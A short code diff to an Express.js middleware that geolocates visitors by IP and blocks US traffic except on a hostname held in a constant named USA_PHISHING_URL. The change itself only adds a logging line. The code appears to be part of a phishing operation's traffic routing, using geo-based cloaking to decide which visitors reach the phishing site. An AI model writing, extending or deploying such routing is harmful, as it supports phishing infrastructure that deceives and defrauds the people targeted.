@@ -44,6 +44,7 @@ app.use((req, res, next) => {
   const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
   const countryCode = ip2location.getCountryShort(ip);
+  console.log(req.hostname, countryCode, ip);
   if ((countryCode === 'US') && (req.hostname !== USA_PHISHING_URL)) {
     return res.status(403).send('Access from the US is blocked.');
   }
